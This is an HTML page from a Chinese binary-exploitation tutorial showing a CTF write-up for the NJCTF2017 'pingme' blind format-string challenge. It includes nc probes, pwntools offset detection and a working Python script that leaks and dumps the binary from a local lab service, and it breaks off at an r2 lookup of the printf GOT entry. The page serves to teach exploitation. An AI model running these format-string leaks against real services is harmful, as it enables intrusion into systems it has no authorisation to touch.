@@ -1,0 +1,1532 @@
+
+
+
+
+<!DOCTYPE html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      <meta http-equiv="x-ua-compatible" content="ie=edge">
+      
+      
+      
+      
+        <meta name="lang:clipboard.copy" content="复制">
+      
+        <meta name="lang:clipboard.copied" content="已复制">
+      
+        <meta name="lang:search.language" content="jp">
+      
+        <meta name="lang:search.pipeline.stopwords" content="True">
+      
+        <meta name="lang:search.pipeline.trimmer" content="True">
+      
+        <meta name="lang:search.result.none" content="没有找到符合条件的结果">
+      
+        <meta name="lang:search.result.one" content="找到 1 个符合条件的结果">
+      
+        <meta name="lang:search.result.other" content="# 个符合条件的结果">
+      
+        <meta name="lang:search.tokenizer" content="[\uff0c\u3002]+">
+      
+      <link rel="shortcut icon" href="../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-0.17.2, mkdocs-material-2.6.6">
+    
+    
+      
+        <title>NJCTF2017 pingme - 二进制漏洞挖掘与利用</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/application.78aab2dc.css">
+      
+        <link rel="stylesheet" href="../../../assets/stylesheets/application-palette.6079476c.css">
+      
+    
+    
+      <script src="../../../assets/javascripts/modernizr.1aa3b519.js"></script>
+    
+    
+      <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
+      
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Fira+Sans:300,400,400i,700|Fira+Mono">
+        <style>body,input{font-family:"Fira Sans","Helvetica Neue",Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Fira Mono","Courier New",Courier,monospace}</style>
+      
+      <link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons">
+    
+    
+      <link rel="stylesheet" href="../../../_static/css/extra.css">
+    
+    
+  </head>
+  
+    
+    
+    <body dir="ltr" data-md-color-primary="white" data-md-color-accent="red">
+  
+    <svg class="md-svg">
+      <defs>
+        
+        
+      </defs>
+    </svg>
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="drawer">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="search">
+    <label class="md-overlay" data-md-component="overlay" for="drawer"></label>
+    
+      <a href="#_1" tabindex="1" class="md-skip">
+        跳转至
+      </a>
+    
+    
+      <header class="md-header" data-md-component="header">
+  <nav class="md-header-nav md-grid">
+    <div class="md-flex">
+      <div class="md-flex__cell md-flex__cell--shrink">
+        <a href="../../.." title="二进制漏洞挖掘与利用" class="md-header-nav__button md-logo">
+          
+            <i class="md-icon">school</i>
+          
+        </a>
+      </div>
+      <div class="md-flex__cell md-flex__cell--shrink">
+        <label class="md-icon md-icon--menu md-header-nav__button" for="drawer"></label>
+      </div>
+      <div class="md-flex__cell md-flex__cell--stretch">
+        <div class="md-flex__ellipsis md-header-nav__title" data-md-component="title">
+          
+            
+              <span class="md-header-nav__topic">
+                二进制漏洞挖掘与利用
+              </span>
+              <span class="md-header-nav__topic">
+                NJCTF2017 pingme
+              </span>
+            
+          
+        </div>
+      </div>
+      <div class="md-flex__cell md-flex__cell--shrink">
+        
+          
+            <label class="md-icon md-icon--search md-header-nav__button" for="search"></label>
+            
+<div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="query" data-md-state="active">
+      <label class="md-icon md-search__icon" for="search"></label>
+      <button type="reset" class="md-icon md-search__icon" data-md-component="reset" tabindex="-1">
+        &#xE5CD;
+      </button>
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="result">
+          <div class="md-search-result__meta">
+            键入以开始搜索
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+          
+        
+      </div>
+      
+    </div>
+  </nav>
+</header>
+    
+    <div class="md-container">
+      
+        
+      
+      
+        
+
+  
+
+<nav class="md-tabs md-tabs--active" data-md-component="tabs">
+  <div class="md-tabs__inner md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../.." title="简介" class="md-tabs__link">
+          简介
+        </a>
+      
+    </li>
+  
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../stackoverflow/stack_intro/" title="栈溢出" class="md-tabs__link">
+          栈溢出
+        </a>
+      
+    </li>
+  
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../fmtstr/fmtstr_intro/" title="格式化字符串漏洞" class="md-tabs__link">
+          格式化字符串漏洞
+        </a>
+      
+    </li>
+  
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../heap/introduction/" title="堆利用" class="md-tabs__link">
+          堆利用
+        </a>
+      
+    </li>
+  
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../io_file/introduction/" title="IO_FILE 利用" class="md-tabs__link">
+          IO_FILE 利用
+        </a>
+      
+    </li>
+  
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../race-condition/introduction/" title="条件竞争" class="md-tabs__link">
+          条件竞争
+        </a>
+      
+    </li>
+  
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../6.1.1_pwn_hctf2016_brop/" title="练习" class="md-tabs__link md-tabs__link--active">
+          练习
+        </a>
+      
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+      
+      <main class="md-main">
+        <div class="md-main__inner md-grid" data-md-component="container">
+          
+            
+              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    <nav class="md-nav md-nav--primary" data-md-level="0">
+  <label class="md-nav__title md-nav__title--site" for="drawer">
+    <span class="md-nav__button md-logo">
+      
+        <i class="md-icon">school</i>
+      
+    </span>
+    二进制漏洞挖掘与利用
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-1" type="checkbox" id="nav-1">
+    
+    <label class="md-nav__link" for="nav-1">
+      简介
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-1">
+        简介
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../.." title="简介" class="md-nav__link">
+      简介
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2">
+    
+    <label class="md-nav__link" for="nav-2">
+      栈溢出
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-2">
+        栈溢出
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../stackoverflow/stack_intro/" title="栈介绍" class="md-nav__link">
+      栈介绍
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../stackoverflow/stackoverflow_basic/" title="栈溢出原理" class="md-nav__link">
+      栈溢出原理
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../stackoverflow/basic_rop/" title="基本 ROP" class="md-nav__link">
+      基本 ROP
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../stackoverflow/others/" title="花式栈溢出技巧" class="md-nav__link">
+      花式栈溢出技巧
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../stackoverflow/medium_rop/" title="中级 ROP" class="md-nav__link">
+      中级 ROP
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../stackoverflow/advanced_rop/" title="高级 ROP" class="md-nav__link">
+      高级 ROP
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3" type="checkbox" id="nav-3">
+    
+    <label class="md-nav__link" for="nav-3">
+      格式化字符串漏洞
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-3">
+        格式化字符串漏洞
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../fmtstr/fmtstr_intro/" title="格式化字符串漏洞原理介绍" class="md-nav__link">
+      格式化字符串漏洞原理介绍
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../fmtstr/fmtstr_exploit/" title="格式化字符串漏洞利用" class="md-nav__link">
+      格式化字符串漏洞利用
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../fmtstr/fmtstr_example/" title="格式化字符串漏洞例子" class="md-nav__link">
+      格式化字符串漏洞例子
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../fmtstr/fmtstr_detect/" title="格式化字符串漏洞检测" class="md-nav__link">
+      格式化字符串漏洞检测
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-5" type="checkbox" id="nav-3-5">
+    
+    <label class="md-nav__link" for="nav-3-5">
+      实验
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-3-5">
+        实验
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../fmtstr/example/picoctf-2014-guess/Write-up_cn/" title="picoctf-2014 guess" class="md-nav__link">
+      picoctf-2014 guess
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-4" type="checkbox" id="nav-4">
+    
+    <label class="md-nav__link" for="nav-4">
+      堆利用
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-4">
+        堆利用
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../heap/introduction/" title="堆利用简介" class="md-nav__link">
+      堆利用简介
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../heap/heap_overview/" title="堆概述" class="md-nav__link">
+      堆概述
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../heap/heap_structure/" title="堆相关数据结构" class="md-nav__link">
+      堆相关数据结构
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../heap/heap_implementation_details/" title="深入理解堆的实现" class="md-nav__link">
+      深入理解堆的实现
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../heap/heapoverflow_basic/" title="堆溢出" class="md-nav__link">
+      堆溢出
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../heap/off_by_one/" title="堆中的 Off-By-One" class="md-nav__link">
+      堆中的 Off-By-One
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../heap/unlink/" title="Unlink" class="md-nav__link">
+      Unlink
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../heap/use_after_free/" title="Use After Free" class="md-nav__link">
+      Use After Free
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../heap/fastbin_attack/" title="Fastbin Attack" class="md-nav__link">
+      Fastbin Attack
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../heap/chunk_extend_shrink/" title="Chunk Extend / Shrink" class="md-nav__link">
+      Chunk Extend / Shrink
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../heap/house_of_einherjar/" title="House Of Einherjar" class="md-nav__link">
+      House Of Einherjar
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../heap/house_of_lore/" title="House of Lore" class="md-nav__link">
+      House of Lore
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../heap/house_of_force/" title="House Of Force" class="md-nav__link">
+      House Of Force
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../heap/unsorted_bin_attack/" title="Unsorted Bin Attack" class="md-nav__link">
+      Unsorted Bin Attack
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../heap/house_of_orange/" title="House of Orange" class="md-nav__link">
+      House of Orange
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-5" type="checkbox" id="nav-5">
+    
+    <label class="md-nav__link" for="nav-5">
+      IO_FILE 利用
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-5">
+        IO_FILE 利用
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../io_file/introduction/" title="FILE 文件结构介绍" class="md-nav__link">
+      FILE 文件结构介绍
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../io_file/fake-vtable-exploit/" title="伪造 vtable 劫持程序流程" class="md-nav__link">
+      伪造 vtable 劫持程序流程
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../io_file/fsop/" title="FSOP" class="md-nav__link">
+      FSOP
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../io_file/exploit-in-libc2.24/" title="新版本 libc 下 IO_FILE 的利用" class="md-nav__link">
+      新版本 libc 下 IO_FILE 的利用
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-6" type="checkbox" id="nav-6">
+    
+    <label class="md-nav__link" for="nav-6">
+      条件竞争
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-6">
+        条件竞争
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../race-condition/introduction/" title="条件竞争介绍" class="md-nav__link">
+      条件竞争介绍
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../race-condition/problem/" title="例题" class="md-nav__link">
+      例题
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-7" type="checkbox" id="nav-7" checked>
+    
+    <label class="md-nav__link" for="nav-7">
+      练习
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-7">
+        练习
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../6.1.1_pwn_hctf2016_brop/" title="HCTF2016 brop" class="md-nav__link">
+      HCTF2016 brop
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active">
+    
+    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="toc">
+    
+    
+      <label class="md-nav__link md-nav__link--active" for="toc">
+        NJCTF2017 pingme
+      </label>
+    
+    <a href="./" title="NJCTF2017 pingme" class="md-nav__link md-nav__link--active">
+      NJCTF2017 pingme
+    </a>
+    
+      
+<nav class="md-nav md-nav--secondary">
+  
+  
+  
+    <label class="md-nav__title" for="toc">目录</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" title="题目复现" class="md-nav__link">
+    题目复现
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#blind-fmt" title="Blind fmt 原理及题目解析" class="md-nav__link">
+    Blind fmt 原理及题目解析
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_2" title="确认漏洞" class="md-nav__link">
+    确认漏洞
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#dump-file" title="dump file" class="md-nav__link">
+    dump file
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#printf-address-system-address" title="printf address &amp; system address" class="md-nav__link">
+    printf address &amp; system address
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#attack" title="attack" class="md-nav__link">
+    attack
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploit" title="Exploit" class="md-nav__link">
+    Exploit
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_3" title="参考资料" class="md-nav__link">
+    参考资料
+  </a>
+  
+</li>
+      
+      
+      
+      
+      
+    </ul>
+  
+</nav>
+    
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../6.1.3_pwn_xdctf2015_pwn200/" title="XDCTF2015 pwn200" class="md-nav__link">
+      XDCTF2015 pwn200
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../6.1.4_pwn_backdoorctf2017_fun_signals/" title="BackdoorCTF2017 Fun-Signals" class="md-nav__link">
+      BackdoorCTF2017 Fun-Signals
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../6.1.5_pwn_grehackctf2017_beerfighter/" title="GreHackCTF2017 beerfighter" class="md-nav__link">
+      GreHackCTF2017 beerfighter
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../6.1.6_pwn_defconctf2015_fuckup/" title="DefconCTF2015 fuckup" class="md-nav__link">
+      DefconCTF2015 fuckup
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../6.1.7_pwn_0ctf2015_freenote/" title="0CTF2015 freenote" class="md-nav__link">
+      0CTF2015 freenote
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../6.1.8_pwn_dctf2017_flex/" title="DCTF2017 Flex" class="md-nav__link">
+      DCTF2017 Flex
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../6.1.9_rhme3_exploitation/" title="RHme3 Exploitation" class="md-nav__link">
+      RHme3 Exploitation
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../6.1.10_0ctf2017_babyheap2017/" title="0CTF2017 BabyHeap2017" class="md-nav__link">
+      0CTF2017 BabyHeap2017
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../6.1.11_9447ctf2015_search_engine/" title="9447CTF2015 Search-Engine" class="md-nav__link">
+      9447CTF2015 Search-Engine
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+<nav class="md-nav md-nav--secondary">
+  
+  
+  
+    <label class="md-nav__title" for="toc">目录</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" title="题目复现" class="md-nav__link">
+    题目复现
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#blind-fmt" title="Blind fmt 原理及题目解析" class="md-nav__link">
+    Blind fmt 原理及题目解析
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_2" title="确认漏洞" class="md-nav__link">
+    确认漏洞
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#dump-file" title="dump file" class="md-nav__link">
+    dump file
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#printf-address-system-address" title="printf address &amp; system address" class="md-nav__link">
+    printf address &amp; system address
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#attack" title="attack" class="md-nav__link">
+    attack
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploit" title="Exploit" class="md-nav__link">
+    Exploit
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_3" title="参考资料" class="md-nav__link">
+    参考资料
+  </a>
+  
+</li>
+      
+      
+      
+      
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content">
+            <article class="md-content__inner md-typeset">
+              
+                
+                
+                  <h1>NJCTF2017 pingme</h1>
+                
+                <ul>
+<li><a href="#题目复现">题目复现</a></li>
+<li><a href="#blind-fmt-原理及题目解析">Blind fmt 原理及题目解析</a></li>
+<li><a href="#exploit">Exploit</a></li>
+<li><a href="#参考资料">参考资料</a></li>
+</ul>
+<p><a href="../../src/writeup/6.1.2_pwn_njctf2017_pingme">下载文件</a></p>
+<h2 id="_1">题目复现<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>在 6.1.1 中我们看到了 blind ROP，这一节中则将看到 blind fmt。它们的共同点是都没有二进制文件，只提供 ip 和端口。</p>
+<p>checksec 如下：
+<div class="codehilite"><pre><span></span>$ checksec -f pingme
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATHFORTIFY Fortified Fortifiable  FILE
+No RELRO        No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   No        0               2       pingme
+</pre></div>
+关闭 ASLR，然后把程序运行起来：
+<div class="codehilite"><pre><span></span>$ socat tcp4-listen:10001,reuseaddr,fork exec:./pingme &amp;
+</pre></div></p>
+<h2 id="blind-fmt">Blind fmt 原理及题目解析<a class="headerlink" href="#blind-fmt" title="Permanent link">&para;</a></h2>
+<p>格式化字符串漏洞我们已经在 3.3.1 中详细讲过了，blind fmt 要求我们在没有二进制文件和 libc.so 的情况下进行漏洞利用，好在程序没有开启任何保护，利用很直接。</p>
+<p>通常有两种方法可以解决这种问题，一种是利用信息泄露把程序从内存中 dump 下来，另一种是使用 pwntools 的 DynELF 模块（关于该模块的使用我们在章节 4.4 中有讲过）。</p>
+<h4 id="_2">确认漏洞<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h4>
+<p>首先你当然不知道这是一个栈溢出还是格式化字符串，栈溢出的话输入一段长字符串，但程序是否崩溃，格式化字符串的话就输入格式字符，看输出。
+<div class="codehilite"><pre><span></span>$ nc 127.0.0.1 10001
+Ping me
+ABCD%7$x
+ABCD44434241
+</pre></div>
+很明显是格式字符串，而且 ABCD 在第 7 个参数的位置，实际上当然不会这么巧，所以需要使用一个脚本去枚举。这里使用 pwntools 的 fmtstr 模块了：
+<div class="codehilite"><pre><span></span><span class="k">def</span> <span class="nf">exec_fmt</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+    <span class="n">info</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+    <span class="k">return</span> <span class="n">info</span>
+<span class="n">auto</span> <span class="o">=</span> <span class="n">FmtStr</span><span class="p">(</span><span class="n">exec_fmt</span><span class="p">)</span>
+<span class="n">offset</span> <span class="o">=</span> <span class="n">auto</span><span class="o">.</span><span class="n">offset</span>
+</pre></div>
+<div class="codehilite"><pre><span></span>[*] Found format string offset: 7
+</pre></div></p>
+<h4 id="dump-file">dump file<a class="headerlink" href="#dump-file" title="Permanent link">&para;</a></h4>
+<p>接下来我们就利用该漏洞把二进制文件从内存中 dump 下来：
+<div class="codehilite"><pre><span></span><span class="k">def</span> <span class="nf">dump_memory</span><span class="p">(</span><span class="n">start_addr</span><span class="p">,</span> <span class="n">end_addr</span><span class="p">):</span>
+    <span class="n">result</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
+    <span class="k">while</span> <span class="n">start_addr</span> <span class="o">&lt;</span> <span class="n">end_addr</span><span class="p">:</span>
+        <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="s1">&#39;10001&#39;</span><span class="p">)</span>
+        <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+        <span class="c1">#print result.encode(&#39;hex&#39;)</span>
+        <span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;%9$s.AAA&quot;</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">start_addr</span><span class="p">)</span>
+        <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;.AAA&quot;</span><span class="p">)[:</span><span class="o">-</span><span class="mi">4</span><span class="p">]</span>
+        <span class="k">if</span> <span class="n">data</span> <span class="o">==</span> <span class="s2">&quot;&quot;</span><span class="p">:</span>
+            <span class="n">data</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span>
+        <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;leaking: 0x</span><span class="si">%x</span><span class="s2"> --&gt; </span><span class="si">%s</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">start_addr</span><span class="p">,</span> <span class="n">data</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;hex&#39;</span><span class="p">)))</span>
+        <span class="n">result</span> <span class="o">+=</span> <span class="n">data</span>
+        <span class="n">start_addr</span> <span class="o">+=</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+        <span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+    <span class="k">return</span> <span class="n">result</span>
+<span class="n">start_addr</span> <span class="o">=</span> <span class="mh">0x8048000</span>
+<span class="n">end_addr</span>   <span class="o">=</span> <span class="mh">0x8049000</span>
+<span class="n">code_bin</span> <span class="o">=</span> <span class="n">dump_memory</span><span class="p">(</span><span class="n">start_addr</span><span class="p">,</span> <span class="n">end_addr</span><span class="p">)</span>
+<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&quot;code.bin&quot;</span><span class="p">,</span> <span class="s2">&quot;wb&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">code_bin</span><span class="p">)</span>
+    <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</pre></div>
+这里构造的 paylaod 和前面有点不同，它把地址放在了后面，是为了防止 printf 的 <code>%s</code> 被 <code>\x00</code> 截断：
+<div class="codehilite"><pre><span></span><span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;%9$s.AAA&quot;</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">start_addr</span><span class="p">)</span>
+</pre></div>
+另外 <code>.AAA</code>，是作为一个标志，我们需要的内存在 <code>.AAA</code> 的前面，最后，偏移由 7 变为 9。</p>
+<p>在没有开启 PIE 的情况下，32 位程序从地址 <code>0x8048000</code> 开始，0x1000 的大小就足够了。在对内存 <code>\x00</code> 进行 leak 时，数据长度为零，直接给它赋值就可以了。</p>
+<p>于是就成了有二进制文件无 libc 的格式化字符串漏洞，在 r2 中查询 printf 的 got 地址：
+<div class="codehilite"><pre><span></span>[0x08048490]&gt; is~printf
+vaddr=0x08048400 paddr=0x00000400 ord=002 fwd=NONE sz=16 bind=GLOBAL type=FUNC name=imp.printf                                                                                        
+[0x08048490]&gt; pd 3 @ 0x08048400
